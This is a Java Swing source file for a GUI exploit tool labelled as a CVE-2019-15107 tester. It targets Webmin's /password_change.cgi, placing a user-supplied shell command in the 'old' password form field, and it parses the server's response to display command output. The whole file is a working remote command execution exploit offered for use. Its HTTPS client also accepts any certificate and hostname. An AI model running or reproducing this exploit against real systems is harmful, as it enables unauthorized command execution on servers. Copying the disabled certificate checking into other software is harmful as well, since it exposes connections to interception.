package org.example;

import okhttp3.*;

import javax.net.ssl.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.FocusAdapter;
import java.awt.event.FocusEvent;
import java.io.IOException;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

public class Main {
    private JPanel panelRoot;
    private JTextField textFieldUrl;
    private JButton buttonSend;
    private JTextField textFieldCmd;
    private JButton buttonSend2;
    private JList listResult;
    private JPanel JPanel1;
    private JPanel CountJpanel;

    private String tip = "程序出错";

    private String TARGET ="/password_change.cgi";



    //解决Okhttp  https证书问题
    public static OkHttpClient strongOkHttpClient() {

        try {
            final TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        @Override
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                        }

                        @Override
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                        }

                        @Override
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return new java.security.cert.X509Certificate[]{};
                        }
                    }
            };

            final SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            final javax.net.ssl.SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
            OkHttpClient.Builder builder = new OkHttpClient.Builder();
            builder.sslSocketFactory(sslSocketFactory,(X509TrustManager) trustAllCerts[0]); // 这一行JDK9以上适用，JDK8把第二个参数去掉

            builder.hostnameVerifier(new HostnameVerifier() {
                @Override
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            });

            return builder.connectTimeout(6, TimeUnit.SECONDS).build();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }

    public Main() {
        buttonSend.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String url = textFieldUrl.getText();
                if(url == null || url.trim().equals("")){
                    JOptionPane.showMessageDialog(null, "url不能为空");
                    return;
                }else {
                    test(url);
                }
            }
        });
        buttonSend2.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String url = textFieldUrl.getText();
                String cmd = textFieldCmd.getText();
                Send(url,cmd);
            }
        });
        textFieldUrl.setText("示例:https://IP:Port");
        textFieldUrl.addFocusListener(new FocusAdapter() {
            @Override
            public void focusGained(FocusEvent e) {
                super.focusGained(e);
                if(textFieldUrl.getText().equals("示例:https://IP:Port")){
                    textFieldUrl.setText("");
                }
            }

            @Override
            public void focusLost(FocusEvent e) {
                super.focusLost(e);
                if(textFieldUrl.getText().length()<1){
                    textFieldUrl.setText("示例:https://IP:Port");
                }
            }
        });

        textFieldCmd.setText("示例:id");
        textFieldCmd.addFocusListener(new FocusAdapter() {
            @Override
            public void focusGained(FocusEvent e) {
                super.focusGained(e);
                if(textFieldCmd.getText().equals("示例:id")){
                    textFieldCmd.setText("");
                }
            }

            @Override
            public void focusLost(FocusEvent e) {
                super.focusLost(e);
                if(textFieldCmd.getText().length()<1){
                    textFieldCmd.setText("示例:id");
                }
            }
        });
    }

    // 显示成功结果
    public void ShowSuccessResults(String res){
        Document document = Jsoup.parse(res);
        String str = document.select("div.panel-body").text();
        DefaultListModel<String> dfl = new DefaultListModel();
        List<String> strList = Arrays.asList(str.split("\\s+"));
        if (str.length()>100){
            for (String s:strList){
                dfl.addElement(s);
            }
        }else {
            dfl.addElement(str);
        }
        listResult.setModel(dfl);
    }

    //展示失败结果
    public void ShowFailResults(String res){
        DefaultListModel<String> dfl = new DefaultListModel();
        dfl.addElement(res);
        listResult.setModel(dfl);
    }
    // 执行命令
    public void  Send(String url,String cmd){
        OkHttpClient okHttpClient = strongOkHttpClient();
        RequestBody requestBody = new FormBody.Builder()
                .add("user","root123456")
                .add("pam","")
                .add("expired","2")
                .add("old", cmd)
                .add("new1","test2")
                .add("new2","test2")
                .build();

        Request request = new Request.Builder()
                .addHeader("Accept-Encoding","gzip, deflate")
                .addHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                .addHeader("Accept-Language","zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
                .addHeader("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
                .addHeader("Connection","close")
                .addHeader("Cookie","redirect=1; testing=1; sid=x; sessiontest=1")
                .addHeader("Content-Type","application/x-www-form-urlencoded")
                .url(url+TARGET)
                .post(requestBody)
                .build();

        try(Response response = okHttpClient.newCall(request).execute()){
            if(response.code()==200){
                String result = response.body().string();
                ShowSuccessResults(result);
            }else {
                ShowFailResults("连接失败");
            }
        } catch (IOException e) {
            ShowFailResults("程序出错或目标无法连接");
        }

    }



    //测试密码修改功能是否开启
    public void test(String url){
        String falsetip = "目标没有开启密码修改功能";
        OkHttpClient okHttpClient = strongOkHttpClient();
        Request request = new Request.Builder()
                .addHeader("Accept-Encoding","gzip, deflate")
                .addHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                .addHeader("Accept-Language","zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
                .addHeader("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
                .addHeader("Connection","close")
                .addHeader("Cookie","redirect=1; testing=1; sid=x; sessiontest=1")
                .addHeader("Content-Type","application/x-www-form-urlencoded")
                .url(url+TARGET)
                .build();
        try(Response response = okHttpClient.newCall(request).execute()){
            if(response.code()==200){
                ShowSuccessResults(response.body().string());
            }else{
                ShowFailResults("连接失败");
            }
        } catch (IOException e) {
            ShowFailResults("程序出错或目标无法连接");
        }

    }
    //初始化
    public void run() {
        JFrame frame = new JFrame("CVE-2019-15107测试");
        frame.setContentPane(new Main().panelRoot);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {

        new Main().run();
    }
}
